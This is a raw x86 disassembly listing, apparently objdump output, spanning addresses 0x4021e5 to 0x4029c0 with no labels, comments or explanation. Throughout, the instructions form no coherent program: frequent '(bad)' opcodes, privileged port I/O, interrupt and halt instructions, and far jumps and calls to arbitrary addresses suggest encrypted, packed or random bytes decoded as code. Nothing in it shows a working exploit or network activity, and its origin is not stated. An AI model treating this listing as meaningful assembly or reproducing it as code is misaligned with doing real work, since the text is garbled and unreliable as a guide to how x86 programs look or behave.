  4021e5:	stos   BYTE PTR es:[edi],al
  4021e6:	inc    ebx
  4021e7:	pushf  
  4021e8:	int3   
  4021e9:	sub    al,0x28
  4021eb:	outs   dx,DWORD PTR ds:[esi]
  4021ec:	ins    DWORD PTR es:[edi],dx
  4021ed:	repz push es
  4021ef:	push   cs
  4021f0:	rcl    BYTE PTR [esi-0x7459c83b],0xb5
  4021f7:	lods   eax,DWORD PTR ds:[esi]
  4021f8:	loopne 0x402254
  4021fa:	test   DWORD PTR [ebp+0x1b39c25a],edi
  402200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402201:	je     0x402242
  402203:	cli    
  402204:	call   0x755a13c4
  402209:	es jecxz 0x4021ad
  40220c:	(bad)
  402210:	cmc    
  402211:	jmp    0x57357a6b
  402216:	inc    esi
  402217:	aas    
  402218:	xor    eax,DWORD PTR [ecx]
  40221a:	clc    
  40221b:	push   0xffffffe7
  40221d:	cmp    BYTE PTR [ebp+0x1c],bl
  402220:	add    ecx,DWORD PTR [esi-0x57459970]
  402226:	mov    ds:0x9a6be6f1,eax
  40222b:	mov    esi,0x1e969b2b
  402230:	xor    ebp,DWORD PTR [eax]
  402232:	pop    ebx
  402233:	lds    ebp,FWORD PTR [ebx]
  402235:	sbb    BYTE PTR [eax+0x39],bl
  402238:	add    ebp,DWORD PTR [eax-0x202e8f74]
  40223e:	sbb    DWORD PTR [edx-0x6221544a],edi
  402244:	sbb    esi,DWORD PTR [ebp+ebx*8+0x3e3bbe22]
  40224b:	ret    
  40224c:	dec    edx
  40224d:	or     ecx,DWORD PTR [ebp-0x55]
  402250:	mov    cl,0x99
  402252:	pop    ss
  402253:	push   cs
  402254:	call   0x9c52a024
  402259:	dec    eax
  40225a:	int    0x59
  40225c:	std    
  40225d:	cwde   
  40225e:	imul   esi,DWORD PTR [esi],0x2c
  402261:	aaa    
  402262:	xchg   ecx,eax
  402263:	adc    al,0x4e
  402265:	or     DWORD PTR [edx+0x75],ebp
  402268:	rcl    BYTE PTR [esi+0x7a],1
  40226b:	jo     0x402265
  40226d:	in     eax,dx
  40226e:	xchg   esi,eax
  40226f:	xlat   BYTE PTR ds:[ebx]
  402270:	dec    ecx
  402271:	pop    esp
  402272:	js     0x402271
  402274:	test   BYTE PTR [ebx-0x5562f13c],dl
  40227a:	push   es
  40227b:	lods   eax,DWORD PTR ds:[esi]
  40227c:	pop    edx
  40227d:	(bad)  
  40227e:	cmp    DWORD PTR [eax],esp
  402280:	into   
  402281:	mov    ah,0x68
  402283:	rcl    BYTE PTR [eax-0x29],0xe0
  402287:	cmc    
  402288:	int3   
  402289:	and    eax,0x53e1fbac
  40228e:	ss lahf 
  402290:	jmp    0x402291
  402292:	lds    eax,FWORD PTR [eax+0x7adaee68]
  402298:	(bad)  
  402299:	in     eax,0x85
  40229b:	pop    ebp
  40229c:	xor    dh,al
  40229e:	push   es
  40229f:	jo     0x402238
  4022a1:	and    ah,BYTE PTR [ecx-0x37]
  4022a4:	dec    edx
  4022a5:	lock cwde 
  4022a7:	mov    eax,0xc88cdd36
  4022ac:	imul   edi,DWORD PTR [ebx],0x1f8ae1ad
  4022b2:	mov    esi,ecx
  4022b4:	pusha  
  4022b5:	scas   eax,DWORD PTR es:[edi]
  4022b6:	dec    ecx
  4022b7:	mov    edi,0xd068f5fa
  4022bc:	out    0x34,eax
  4022be:	pop    ecx
  4022bf:	pop    edi
  4022c0:	add    cl,al
  4022c2:	add    ebp,ebx
  4022c4:	xchg   BYTE PTR [esi-0x4f3c0e15],ah
  4022ca:	adc    BYTE PTR [ebx],bh
  4022cc:	imul   esi,edx,0xeb1f7747
  4022d2:	imul   BYTE PTR [ecx+0x20]
  4022d5:	lods   eax,DWORD PTR ds:[esi]
  4022d6:	sbb    ah,al
  4022d8:	iret   
  4022d9:	mov    ebx,0xa772f1a6
  4022de:	push   0x2f9fa268
  4022e3:	cwde   
  4022e4:	or     dl,BYTE PTR [eax-0x36]
  4022e7:	jp     0x402333
  4022e9:	stos   BYTE PTR es:[edi],al
  4022ea:	adc    eax,DWORD PTR [edi-0xf]
  4022ed:	(bad)  
  4022ee:	mov    ebx,0xfa4be016
  4022f3:	sbb    BYTE PTR [edx-0x2e],cl
  4022f6:	jns    0x402278
  4022f8:	xchg   esp,eax
  4022f9:	fimul  DWORD PTR [ecx]
  4022fb:	push   edx
  4022fc:	lods   eax,DWORD PTR ds:[esi]
  4022fd:	sub    al,0x11
  4022ff:	sar    cl,0xa5
  402302:	inc    eax
  402303:	sub    al,BYTE PTR ds:0x133f4b59
  402309:	push   eax
  40230a:	mov    ebp,0x350913ff
  40230f:	sbb    al,0xd4
  402311:	sti    
  402312:	cs inc esi
  402314:	fwait
  402315:	cmp    BYTE PTR [si-0x7a15],0xab
  40231b:	inc    esi
  40231c:	and    DWORD PTR [ecx],esp
  40231e:	(bad)  
  40231f:	(bad)  
  402320:	sub    bl,BYTE PTR [edx-0x21]
  402323:	scas   eax,DWORD PTR es:[edi]
  402324:	out    0xcf,eax
  402326:	xchg   BYTE PTR [ecx],ch
  402328:	stos   DWORD PTR es:[edi],eax
  402329:	push   ds
  40232a:	push   edi
  40232b:	(bad)  
  40232c:	pop    esp
  40232d:	add    ebx,DWORD PTR [ecx+0x4fd3c16e]
  402333:	xchg   BYTE PTR [eax],dh
  402335:	rcr    DWORD PTR [esi],cl
  402337:	lods   eax,DWORD PTR ds:[esi]
  402338:	xor    DWORD PTR [eax-0x77],0x5a5c1640
  40233f:	xchg   edi,eax
  402340:	mov    ah,0x34
  402342:	and    eax,0xe0941739
  402347:	in     eax,dx
  402348:	rol    BYTE PTR [ebp+0x31],0xb2
  40234c:	aam    0x4e
  40234e:	jae    0x4023a5
  402350:	xchg   DWORD PTR [ebx+eiz*8+0x6ac43231],ebx
  402357:	push   cs
  402358:	dec    ebx
  402359:	inc    eax
  40235a:	sbb    ah,BYTE PTR [edi-0x57]
  40235d:	inc    ebp
  40235e:	or     BYTE PTR [ecx+0x68],bl
  402361:	xchg   DWORD PTR [edi+eiz*1-0x587f4795],edi
  402368:	aaa    
  402369:	test   ah,cl
  40236b:	jg     0x4023c7
  40236d:	mov    dh,0x8e
  40236f:	push   cs
  402370:	add    esp,DWORD PTR [esi-0x39886a18]
  402376:	repnz sahf 
  402378:	out    0xa2,al
  40237a:	ins    DWORD PTR es:[edi],dx
  40237b:	mov    ds:0xd209e972,al
  402380:	aas    
  402381:	add    al,0x34
  402384:	ret    0xff0
  402387:	(bad)  
  402388:	xor    eax,0xd0da3bc5
  40238d:	push   es
  40238e:	mov    eax,ds:0xf409b412
  402393:	sbb    DWORD PTR [esi-0x6e776b11],esi
  402399:	mov    dh,0x17
  40239b:	fcmovnu st,st(5)
  40239d:	call   0x1046:0x656a2aaf
  4023a4:	shr    BYTE PTR [edi-0x3a14ca06],1
  4023aa:	inc    ebx
  4023ab:	ds repnz xor bl,ch
  4023af:	sar    DWORD PTR ds:0x3f529613,1
  4023b5:	shl    DWORD PTR ds:0xc746,cl
  4023ba:	jg     0x40242b
  4023bc:	add    edi,edi
  4023be:	repnz data16 mov ds,WORD PTR [esi]
  4023c2:	push   ss
  4023c3:	cmp    edx,0xffffff8b
  4023c6:	mov    BYTE PTR [edx-0x79c102d2],0xb6
  4023cd:	inc    esi
  4023ce:	fwait
  4023cf:	adc    BYTE PTR [esi+0x3],0x62
  4023d3:	aad    0xb7
  4023d5:	jne    0x4023fb
  4023d7:	dec    ebp
  4023d8:	cli    
  4023d9:	jne    0x402458
  4023db:	inc    ebx
  4023dc:	add    DWORD PTR [ebx+eax*1-0x46a2fdf3],ebx
  4023e3:	outs   dx,DWORD PTR ds:[esi]
  4023e4:	pushf  
  4023e5:	mov    esp,DWORD PTR [esi]
  4023e7:	fwait
  4023e8:	jns    0x402382
  4023ea:	xor    ax,0x55d1
  4023ee:	sub    BYTE PTR [esi],al
  4023f0:	sar    BYTE PTR [edi-0x28],1
  4023f3:	ficom  DWORD PTR [edx]
  4023f5:	fnstenv [ecx-0x3afc187f]
  4023fb:	inc    ecx
  4023fc:	mov    cl,0xd9
  4023fe:	and    BYTE PTR [esi],dl
  402400:	fidivr WORD PTR [eax+0x58]
  402403:	push   edi
  402404:	imul   esp,esp,0x70
  402407:	out    0xd1,eax
  402409:	mov    cl,0xc
  40240b:	arpl   si,cx
  40240d:	push   ecx
  40240e:	(bad)  
  40240f:	xchg   edx,eax
  402410:	inc    esp
  402411:	out    dx,al
  402412:	push   ds
  402413:	push   ebx
  402414:	imul   edi,DWORD PTR [ebp+ebp*2+0x187b4414],0xffffffc5
  40241c:	adc    al,0x59
  40241e:	clc    
  40241f:	data16 icebp 
  402421:	out    dx,eax
  402422:	enter  0xa2e3,0xdb
  402426:	add    al,0x4d
  402428:	pushf  
  402429:	cmp    eax,0x3876dac4
  40242e:	lea    edi,[ebx+0x3660ed85]
  402434:	arpl   bx,cx
  402436:	mov    ch,0x90
  402438:	dec    edx
  402439:	push   0x6c13d38d
  40243e:	xchg   edx,eax
  40243f:	xor    DWORD PTR [esi+0x198d6d74],esp
  402445:	adc    eax,0x5b847704
  40244a:	xor    BYTE PTR [edi+edi*8-0x28060d1e],dl
  402451:	pop    esi
  402452:	(bad)  
  402453:	call   0x9d2d4b61
  402458:	mov    bl,0x80
  40245a:	fwait
  40245b:	mov    cl,ch
  40245d:	sahf   
  40245e:	jne    0x402431
  402460:	jp     0x40248c
  402462:	jo     0x402453
  402464:	fistp  QWORD PTR [ebx+0x25eb5d05]
  40246a:	outs   dx,BYTE PTR ds:[esi]
  40246b:	and    ch,BYTE PTR [ecx]
  40246d:	jb     0x4024e0
  40246f:	mov    eax,0x80dd7448
  402474:	xchg   edx,eax
  402475:	(bad)  
  402476:	dec    ecx
  402477:	jo     0x4024f5
  402479:	push   es
  40247a:	or     esi,esp
  40247c:	or     edx,eax
  40247e:	inc    edx
  40247f:	dec    esp
  402480:	add    al,0x54
  402482:	fs pop es
  402484:	outs   dx,DWORD PTR ds:[esi]
  402485:	sub    BYTE PTR [edx+0x3412602],0x4
  40248c:	xor    esi,DWORD PTR [edi]
  40248e:	(bad)
  402491:	and    DWORD PTR [eax+0x2de8ca9a],edi
  402497:	or     ecx,DWORD PTR [esp+ebx*1+0x21]
  40249b:	enter  0xae66,0x8
  40249f:	sub    eax,0xb3cf83b8
  4024a4:	sbb    eax,esi
  4024a6:	inc    BYTE PTR [edx-0x5c]
  4024a9:	loopne 0x402472
  4024ab:	add    BYTE PTR [edi],dh
  4024ad:	data16 (bad) 
  4024b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024b1:	loope  0x402440
  4024b3:	or     ah,ah
  4024b5:	jl     0x402444
  4024b7:	add    BYTE PTR [ecx+0x8b8967f],ah
  4024bd:	aaa    
  4024be:	aaa    
  4024bf:	hlt    
  4024c0:	mul    edx
  4024c2:	add    DWORD PTR [edx+eax*8-0x6366eaef],edx
  4024c9:	nop
  4024ca:	outs   dx,DWORD PTR ds:[esi]
  4024cb:	pop    ebx
  4024cc:	loopne 0x402531
  4024ce:	mov    bl,0xff
  4024d0:	sbb    bl,ch
  4024d2:	inc    edi
  4024d3:	cmc    
  4024d4:	xlat   BYTE PTR ds:[ebx]
  4024d5:	js     0x40250e
  4024d7:	(bad)  
  4024d8:	stos   BYTE PTR es:[edi],al
  4024d9:	adc    esi,ebx
  4024db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024dc:	std    
  4024dd:	push   ebx
  4024de:	into   
  4024df:	dec    ebx
  4024e0:	scas   al,BYTE PTR es:[edi]
  4024e1:	or     edx,0xf036ec2
  4024e7:	or     al,0x5c
  4024e9:	adc    eax,DWORD PTR [eax]
  4024eb:	xchg   DWORD PTR [edx-0x16],ebp
  4024ee:	stos   DWORD PTR es:[edi],eax
  4024ef:	int    0xc7
  4024f1:	mov    gs,WORD PTR ds:0x86d905e3
  4024f7:	mov    ds:0x4bacf7a4,eax
  4024fc:	(bad)  
  4024fd:	cmp    al,0x51
  4024ff:	add    ecx,DWORD PTR [eax]
  402501:	inc    edx
  402502:	(bad)  
  402503:	cmp    ah,bl
  402505:	retf   
  402506:	test   BYTE PTR [esi],0x78
  402509:	mov    bh,0x8d
  40250b:	mov    ah,0x4a
  40250d:	in     al,dx
  40250e:	xchg   ecx,eax
  40250f:	xchg   BYTE PTR [ecx-0x1d6e0988],al
  402515:	xchg   esi,eax
  402516:	mov    cl,0x51
  402518:	aaa    
  402519:	fwait
  40251a:	ret    
  40251b:	or     eax,0x92ed3a7d
  402520:	in     eax,0xc8
  402522:	mov    dl,0x18
  402524:	ret    0x17bd
  402527:	popf   
  402528:	retf   0x50b0
  40252b:	jbe    0x402582
  40252d:	sub    edx,DWORD PTR cs:[eax-0x59dd300a]
  402534:	sub    al,0x5f
  402536:	push   edx
  402537:	mov    esi,ecx
  402539:	sub    eax,0xe3806fea
  40253e:	gs std 
  402540:	aam    0x59
  402542:	cld    
  402543:	add    eax,0xaf91e714
  402548:	sahf   
  402549:	inc    esi
  40254a:	pop    edi
  40254b:	fs js  0x40254d
  40254e:	imul   edi,edx,0xffffff8a
  402551:	jecxz  0x402569
  402553:	xchg   ecx,eax
  402554:	leave  
  402555:	arpl   WORD PTR [ebp-0x24],si
  402558:	stos   BYTE PTR es:[edi],al
  402559:	ins    BYTE PTR es:[edi],dx
  40255a:	cli    
  40255b:	js     0x4025a5
  40255d:	mov    ch,0xd4
  40255f:	push   0x37a30a8c
  402564:	or     al,0xd3
  402566:	mov    dh,0x54
  402568:	xchg   edi,eax
  402569:	push   eax
  40256a:	mov    al,cs:0xdf7ca201
  402570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402571:	aas    
  402572:	xor    esi,DWORD PTR [ebp+eiz*1-0x2e5b2851]
  402579:	adc    al,cl
  40257b:	(bad)
  40257f:	imul   ebp,DWORD PTR [edi],0xc43d839c
  402585:	jp     0x40254e
  402587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402588:	ins    BYTE PTR es:[edi],dx
  402589:	fldenv [ebx]
  40258b:	inc    esp
  40258c:	mov    BYTE PTR [ebx],ah
  40258e:	lods   al,BYTE PTR ds:[esi]
  40258f:	rcl    DWORD PTR [ebx+0x5e02d2b4],0x3
  402596:	push   esp
  402597:	ror    edi,cl
  402599:	out    dx,al
  40259a:	inc    DWORD PTR [ecx-0x51]
  40259d:	pop    ebp
  40259e:	js     0x4025ab
  4025a0:	(bad)  
  4025a1:	cmp    al,0x67
  4025a3:	mov    ds:0x34dab2a,al
  4025a8:	jecxz  0x4025a4
  4025aa:	js     0x402608
  4025ac:	jle    0x4025bf
  4025ae:	xchg   ebp,eax
  4025af:	ret    
  4025b0:	and    ecx,0xca15af58
  4025b6:	(bad)  
  4025b7:	in     eax,0x77
  4025b9:	jp     0x4025ab
  4025bb:	je     0x4025f0
  4025bd:	xchg   ebp,eax
  4025be:	aam    0x79
  4025c0:	adc    ebp,DWORD PTR [esi-0x3a]
  4025c3:	sar    DWORD PTR [edi],0x97
  4025c6:	xor    dh,BYTE PTR [ecx+0x19]
  4025c9:	push   eax
  4025ca:	in     al,0xe
  4025cc:	push   ecx
  4025cd:	out    0xb,al
  4025cf:	or     BYTE PTR [ebp-0x1c],al
  4025d2:	outs   dx,DWORD PTR ds:[esi]
  4025d3:	ja     0x40264d
  4025d5:	push   edi
  4025d6:	mov    bh,0x82
  4025d8:	jne    0x40260a
  4025da:	icebp  
  4025db:	mov    dh,0x20
  4025dd:	inc    edi
  4025de:	mov    ds:0x91096c94,eax
  4025e3:	outs   dx,DWORD PTR ds:[esi]
  4025e4:	test   al,0x9e
  4025e6:	test   eax,0x551b2164
  4025eb:	xchg   ebp,eax
  4025ec:	popa   
  4025ed:	push   0x6e3593cc
  4025f2:	push   es
  4025f3:	out    dx,al
  4025f4:	aam    0xd0
  4025f6:	jmp    0xc8a4c179
  4025fb:	lods   al,BYTE PTR ds:[esi]
  4025fc:	xchg   ecx,eax
  4025fd:	sbb    al,0x7f
  4025ff:	push   esp
  402600:	or     ah,BYTE PTR [esi]
  402602:	cmp    DWORD PTR ds:0x8dc2db46,esi
  402608:	shr    BYTE PTR [ecx+0x5c],cl
  40260b:	and    ebp,esi
  40260d:	pop    ss
  40260e:	stos   DWORD PTR es:[edi],eax
  40260f:	mov    ah,0x18
  402611:	neg    ch
  402613:	les    esi,FWORD PTR [esi-0x6b8e8caa]
  402619:	out    0xa7,al
  40261b:	in     eax,0x37
  40261d:	test   eax,0x48c1de0f
  402622:	and    eax,0x1c2064ef
  402627:	outs   dx,DWORD PTR ds:[esi]
  402628:	jo     0x40262a
  40262a:	inc    BYTE PTR [esi]
  40262c:	jge    0x4025b9
  40262e:	leave  
  40262f:	lods   al,BYTE PTR ds:[esi]
  402630:	add    BYTE PTR [ecx-0x1af15213],cl
  402636:	imul   edi,DWORD PTR [edi],0x69b20994
  40263c:	mov    ds:0x3f4ac412,eax
  402641:	outs   dx,BYTE PTR ds:[esi]
  402642:	in     eax,dx
  402643:	(bad)  
  402644:	bound  edi,QWORD PTR [edx+0x25d55f51]
  40264a:	pop    esi
  40264b:	mov    ds:0xad0aad2a,eax
  402650:	lods   al,BYTE PTR ds:[esi]
  402651:	in     al,0x1f
  402653:	push   ecx
  402654:	and    DWORD PTR [ebp-0x70],eax
  402657:	mov    bl,0x17
  402659:	shr    BYTE PTR [ebx-0x64],1
  40265c:	test   dh,cl
  40265e:	or     eax,0x4e9d41af
  402663:	shr    BYTE PTR [eax+0x10],0x79
  402667:	jbe    0x4026df
  402669:	dec    ebp
  40266a:	popa   
  40266b:	pop    ss
  40266c:	adc    al,0x93
  40266e:	inc    ecx
  40266f:	ret    
  402670:	mov    dh,0x15
  402672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402673:	daa    
  402674:	mov    bl,0xf5
  402676:	imul   edi,DWORD PTR ds:0x84937f8,0xffffff98
  40267d:	inc    edx
  40267e:	clc    
  40267f:	fisubr WORD PTR [eax-0x76]
  402682:	call   0xa71c:0x59fccc4a
  402689:	imul   DWORD PTR [ecx]
  40268b:	xor    esp,DWORD PTR [edi]
  40268d:	sbb    bh,0x3
  402690:	inc    ecx
  402691:	mov    eax,DWORD PTR [ebp+0x34]
  402694:	retf   0x566c
  402697:	js     0x402664
  402699:	and    DWORD PTR [edi+0xf],eax
  40269c:	and    ebx,DWORD PTR [eax+edx*8+0x1]
  4026a0:	xchg   DWORD PTR [edi-0x515db853],edx
  4026a6:	sub    al,0xf2
  4026a8:	rcr    ebx,cl
  4026aa:	pop    ebp
  4026ab:	clc    
  4026ac:	xchg   ebp,eax
  4026ad:	cmp    eax,0xb7540b85
  4026b2:	int3   
  4026b3:	pop    edi
  4026b4:	mov    ecx,0x29240364
  4026b9:	lahf   
  4026ba:	jne    0x4026da
  4026bc:	inc    ebp
  4026bd:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026bf:	pusha  
  4026c0:	xor    edi,DWORD PTR [ecx-0x6cee7c57]
  4026c6:	push   DWORD PTR [ecx-0xfbaae60]
  4026cc:	push   edi
  4026cd:	je     0x4026d5
  4026cf:	test   al,0x3
  4026d1:	adc    eax,eax
  4026d3:	leave  
  4026d4:	(bad)  
  4026d5:	sbb    al,0x3b
  4026d7:	inc    esi
  4026d8:	cmp    DWORD PTR [edi+0x23],edi
  4026db:	cwde   
  4026dc:	and    ecx,esi
  4026de:	xor    al,BYTE PTR [esi+0x6dc949dc]
  4026e4:	enter  0x70d9,0x1f
  4026e8:	mov    edi,0xacf9a2e3
  4026ed:	jmp    0x4536c50b
  4026f2:	into   
  4026f3:	add    ebx,DWORD PTR [eax+0x17]
  4026f6:	push   ebx
  4026f7:	je     0x4026f6
  4026f9:	mov    esp,0x94cc0bdf
  4026fe:	fcom   QWORD PTR [ebx+0x37]
  402701:	call   0xf9838ed7
  402706:	adc    eax,0xd2b0d94
  40270b:	mov    dh,0xe3
  40270d:	cs std 
  40270f:	daa    
  402710:	mov    ds:0x3ca5dd78,eax
  402715:	xchg   edi,eax
  402716:	dec    esi
  402717:	pop    ss
  402718:	into   
  402719:	mov    eax,0x747f70ff
  40271e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40271f:	retf   0x895b
  402722:	pop    es
  402723:	js     0x402792
  402725:	test   DWORD PTR [edx+esi*8-0x6454ae53],0x118ce892
  402730:	sub    al,0x36
  402732:	push   ebp
  402733:	and    al,0xb2
  402735:	ss je  0x402764
  402738:	retf   
  402739:	jp     0x40275f
  40273b:	aas    
  40273c:	fs inc esp
  40273e:	mov    esi,0x5000ccaf
  402743:	mov    ds:0x4c19fc93,al
  402748:	mov    esp,0x11ca02bc
  40274d:	or     eax,0xcc06213
  402752:	jae    0x402770
  402754:	jge    0x40274e
  402756:	inc    edx
  402757:	mul    DWORD PTR [esi]
  402759:	xlat   BYTE PTR ds:[ebx]
  40275a:	jmp    0xbf10b34e
  40275f:	xor    al,0x87
  402761:	enter  0x2916,0x50
  402765:	mov    al,0xac
  402767:	push   ecx
  402768:	pusha  
  402769:	jp     0x4027bf
  40276b:	in     al,0x93
  40276d:	ror    DWORD PTR [edx+ebp*8-0x33],0x30
  402772:	adc    dh,BYTE PTR [esi-0x505fd074]
  402778:	jae    0x40272b
  40277a:	int    0xb7
  40277c:	imul   eax,DWORD PTR [eax+0x320310b0],0xfffffff3
  402783:	cmp    DWORD PTR [ebp-0xd],esp
  402786:	stos   BYTE PTR es:[edi],al
  402787:	xor    BYTE PTR [edx+0x6e],dl
  40278a:	imul   ecx,DWORD PTR [esi+0xa7c1689],0x389b72e8
  402794:	sbb    al,0xba
  402796:	(bad)  
  402797:	sbb    BYTE PTR [edi-0xa],ah
  40279a:	cdq    
  40279b:	push   ebx
  40279c:	mov    ch,0x2c
  40279e:	mov    al,ds:0x58a1001a
  4027a3:	repnz lods eax,DWORD PTR ds:[esi]
  4027a5:	jle    0x402816
  4027a7:	shl    BYTE PTR [ebp+0x57],1
  4027aa:	fidivr WORD PTR [eax]
  4027ac:	mov    ebp,DWORD PTR [ebp-0x72594729]
  4027b2:	div    BYTE PTR [eax+0x6f]
  4027b5:	outs   dx,BYTE PTR ds:[esi]
  4027b6:	pusha  
  4027b7:	pop    edi
  4027b8:	in     al,dx
  4027b9:	ret    0xec5a
  4027bc:	popa   
  4027bd:	ds test eax,0xf63eaf01
  4027c3:	outs   dx,BYTE PTR ds:[esi]
  4027c4:	pop    ax
  4027c6:	sub    ecx,DWORD PTR [edx-0x12]
  4027c9:	mov    DWORD PTR [esi+0x581c935a],edx
  4027cf:	jmp    0xb6665996
  4027d4:	ftst   
  4027d6:	xchg   BYTE PTR [edx-0x708871c9],cl
  4027dc:	sbb    DWORD PTR [ebx+0x57be14ec],ecx
  4027e2:	in     eax,dx
  4027e3:	xchg   BYTE PTR [edx-0x589ec6a3],al
  4027e9:	into   
  4027ea:	sahf   
  4027eb:	dec    esp
  4027ec:	(bad)  
  4027ed:	mov    ah,0x3a
  4027ef:	popa   
  4027f0:	push   es
  4027f1:	fs jl  0x402860
  4027f4:	sar    cl,0xdc
  4027f7:	jno    0x4027f0
  4027f9:	out    0xe6,eax
  4027fb:	ror    BYTE PTR [ecx],cl
  4027fd:	jp     0x4027d7
  4027ff:	pop    ds
  402800:	cmp    al,0xcc
  402802:	adc    eax,0xa7225c12
  402807:	xchg   esp,eax
  402808:	xor    BYTE PTR [bx-0x38],ch
  40280c:	mov    ah,0x54
  40280e:	out    dx,eax
  40280f:	(bad)  
  402810:	in     al,0xa0
  402812:	rcl    BYTE PTR [edi+0x74f63792],1
  402818:	dec    eax
  402819:	sahf   
  40281a:	outs   dx,BYTE PTR ds:[esi]
  40281b:	mov    ecx,0xc12a14fb
  402820:	push   eax
  402821:	rcr    BYTE PTR [edi+esi*4],1
  402824:	fwait
  402825:	add    al,BYTE PTR [esi+0x4a]
  402828:	cs xchg ecx,eax
  40282a:	pop    esp
  40282b:	inc    eax
  40282c:	pop    eax
  40282d:	fldenv [ebx-0x20f0cb31]
  402833:	or     eax,0xf4f8f8c7
  402838:	mov    ebp,0x3b27effa
  40283d:	cmp    al,0x17
  40283f:	sbb    ecx,DWORD PTR [eax+0x367a4cd9]
  402845:	jecxz  0x402811
  402847:	pop    esi
  402848:	jmp    0x4028bf
  40284a:	loopne 0x402825
  40284c:	retf   
  40284d:	in     eax,0x5e
  40284f:	push   0xac0a01eb
  402854:	sub    dl,BYTE PTR es:[edx-0x60]
  402858:	mov    bh,0xd9
  40285a:	mov    WORD PTR [esi+0x55],ds
  40285d:	xchg   BYTE PTR [ecx+esi*2],ah
  402860:	fisub  WORD PTR ds:0xf5909e42
  402866:	pop    ebp
  402867:	jno    0x4028aa
  402869:	and    edx,DWORD PTR [edi]
  40286b:	xor    eax,0xf950b273
  402870:	fs scas al,BYTE PTR es:[edi]
  402872:	cmp    ecx,DWORD PTR [edx+0x4a]
  402875:	loop   0x4027f9
  402877:	repz in al,dx
  402879:	shr    BYTE PTR [esi+0x15],cl
  40287c:	inc    esi
  40287d:	sub    ecx,edi
  40287f:	cmp    bl,BYTE PTR [ecx-0x1f183e3d]
  402885:	jmp    0xb57a:0xd29a15c5
  40288c:	shr    dl,cl
  40288e:	retf   0xc089
  402891:	jmp    0x3712100d
  402896:	xchg   ecx,eax
  402897:	fidivr WORD PTR [edx]
  402899:	push   0x167e52
  40289e:	loope  0x4028d3
  4028a0:	hlt    
  4028a1:	xchg   esi,eax
  4028a2:	popa   
  4028a3:	push   ebx
  4028a4:	mov    ebx,0x7266d00d
  4028a9:	mov    ch,0xbe
  4028ab:	rol    DWORD PTR [edx+0x50],1
  4028ae:	mov    ebp,0x33f2fd14
  4028b3:	jno    0x4028f4
  4028b5:	bnd jo 0x402914
  4028b8:	cmp    al,0x9b
  4028ba:	imul   ebp,DWORD PTR [ebx+0x0],0x29525c9c
  4028c1:	mov    edx,0x52bc3829
  4028c6:	mov    esp,0x152baa48
  4028cb:	test   esi,0x2b751bb
  4028d1:	dec    ebp
  4028d2:	sahf   
  4028d3:	and    DWORD PTR [ebp+0x64556d94],edi
  4028d9:	cmp    dl,BYTE PTR [ebp-0x7839aa5e]
  4028df:	retf   0x8b5d
  4028e2:	cmp    BYTE PTR [ebx+edx*1+0x5c2c6f6],0x39
  4028ea:	add    esi,DWORD PTR [ecx]
  4028ec:	dec    esp
  4028ed:	lods   al,BYTE PTR ds:[esi]
  4028ee:	jmp    0xf99c:0xf64db75d
  4028f5:	inc    edx
  4028f6:	bound  eax,QWORD PTR [ebp+0x26d7c1b3]
  4028fc:	int3   
  4028fd:	das    
  4028fe:	jns    0x40292d
  402900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402901:	aaa    
  402902:	in     al,dx
  402903:	lods   al,BYTE PTR ds:[esi]
  402904:	adc    al,0x2f
  402906:	jecxz  0x402954
  402908:	and    BYTE PTR ds:0xa18d7e00,al
  40290e:	mov    esi,0x5f9c781e
  402913:	rcr    DWORD PTR [edi+0x26628744],1
  402919:	xchg   ebp,eax
  40291a:	scas   al,BYTE PTR es:[edi]
  40291b:	push   esi
  40291c:	out    dx,eax
  40291d:	test   edx,edi
  40291f:	lahf   
  402920:	cmp    BYTE PTR [edi],ch
  402922:	mov    es,WORD PTR [ecx+0x1e18c340]
  402928:	ja     0x4028bd
  40292a:	nop
  40292b:	aam    0xc0
  40292d:	sbb    ebp,DWORD PTR [esi-0x651bfd68]
  402933:	out    0x2e,al
  402935:	add    al,0x9d
  402937:	das    
  402938:	push   eax
  402939:	in     al,0x8d
  40293b:	mov    bh,0x5a
  40293d:	arpl   cx,cx
  40293f:	xchg   esp,eax
  402940:	retf   0x4193
  402943:	scas   al,BYTE PTR es:[edi]
  402944:	es jbe 0x402999
  402947:	test   DWORD PTR [edi+0x10a463aa],esi
  40294d:	add    DWORD PTR [edi+0x61a72d39],0x5d84ba40
  402957:	mov    fs,edi
  402959:	dec    ebx
  40295a:	in     al,dx
  40295b:	loopne 0x4029c7
  40295d:	mov    ah,0xeb
  40295f:	or     BYTE PTR [ebp+0x6b],bl
  402962:	add    DWORD PTR [edx+0x57],ebx
  402965:	js     0x402986
  402967:	lods   al,BYTE PTR ds:[esi]
  402968:	push   es
  402969:	xlat   BYTE PTR ds:[ebx]
  40296a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40296b:	push   es
  40296c:	dec    ebx
  40296d:	inc    edi
  40296e:	add    edi,0x276bf063
  402974:	or     al,BYTE PTR [ebp+eax*8-0x6c]
  402978:	in     al,0x8b
  40297a:	mov    ah,0x38
  40297c:	jmp    0xa8e5:0xb550666f
  402983:	cwde   
  402984:	imul   edi,esp,0xba3f6ff8
  40298a:	lea    ebp,[edi-0x5f]
  40298d:	xor    ecx,DWORD PTR [edx+0x4]
  402990:	mov    edx,0xd41aeb35
  402995:	bound  ebp,QWORD PTR [eax-0x59590f14]
  40299b:	push   edi
  40299c:	sti    
  40299d:	add    ebp,DWORD PTR [edx-0x78]
  4029a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029a1:	dec    ecx
  4029a2:	aas    
  4029a3:	xlat   BYTE PTR ds:[ebx]
  4029a4:	lds    ecx,FWORD PTR [edx]
  4029a6:	mov    ch,0x14
  4029a8:	mov    edi,edi
  4029aa:	cmp    ebp,ebp
  4029ac:	outs   dx,DWORD PTR ds:[esi]
  4029ad:	frstor [eax-0x7020a405]
  4029b3:	in     eax,dx
  4029b4:	mov    WORD PTR [ebx-0x58],ds
  4029b7:	push   edi
  4029b8:	jmp    0x887c:0x7ed3d9cc
  4029bf:	pop    es
  4029c0:	loop   0x40297f
